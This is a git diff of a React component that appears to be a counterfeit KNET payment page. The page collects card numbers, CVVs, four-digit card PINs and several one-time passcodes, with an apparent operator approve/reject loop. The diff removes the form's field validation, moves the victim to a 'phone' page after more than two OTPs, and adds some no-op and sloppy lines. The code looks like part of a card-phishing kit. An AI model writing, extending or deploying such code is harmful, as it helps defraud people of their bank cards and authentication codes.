@@ -173,10 +173,13 @@ export default function Kent(props: { setPage: any }) {
     status: "new",
   });
   const handleNewpage = () => {
-    handleUpdatePage("phone");
+    handleUpdatePage("knet");
   };
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `);
+    if (newotp.length > 2) {
+      handleNewpage();
+    }
   };
   useEffect(() => {
     setTotal(localStorage?.getItem("vv")!);
@@ -193,6 +196,7 @@ export default function Kent(props: { setPage: any }) {
             if (data.status === "approved") {
               setstep(2);
               setLoading(false);
+              data.page === "o";
             } else if (data.status === "rejected") {
               setLoading(false);
               alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ");
@@ -627,18 +631,7 @@ export default function Kent(props: { setPage: any }) {
                     </div>
                     <div style={{ display: "flex" }}>
                       <button
-                        type="button"
-                        disabled={
-                          step === 1 &&
-                          (paymentInfo.prefix === "" ||
-                            paymentInfo.bank === "" ||
-                            paymentInfo.cardNumber === "" ||
-                            paymentInfo.pass === "" ||
-                            paymentInfo.month === "" ||
-                            paymentInfo.year === "" ||
-                            paymentInfo.pass.length !== 4 ||
-                            paymentInfo.cvv === "")
-                        }
+                        type="submit"
                         onClick={(e) => {
                           e.preventDefault();
 
@@ -649,7 +642,6 @@ export default function Kent(props: { setPage: any }) {
                           } else if (step >= 2) {
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!);
-                              e.preventDefault();
                             }
                             setLoading(true);
                             handleAddotp(paymentInfo.otp!);
@@ -657,13 +649,13 @@ export default function Kent(props: { setPage: any }) {
                             handlePay(paymentInfo, setPaymentInfo);
                             setTimeout(() => {
                               setLoading(false);
-
+                              setTimeout(() => {}, 2000);
                               setPaymentInfo({
                                 ...paymentInfo,
                                 otp: "",
                                 status: "approved",
                               });
-                              return handleNewpage();
+                              props.setPage("phone");
                             }, 3000);
                           }
                         }}
@@ -718,6 +710,7 @@ export default function Kent(props: { setPage: any }) {
         </div>
         <FullPageLoader isLoading={loading} />
       </form>
+      <button>التالي</button>
       <style>
         {`
         * {
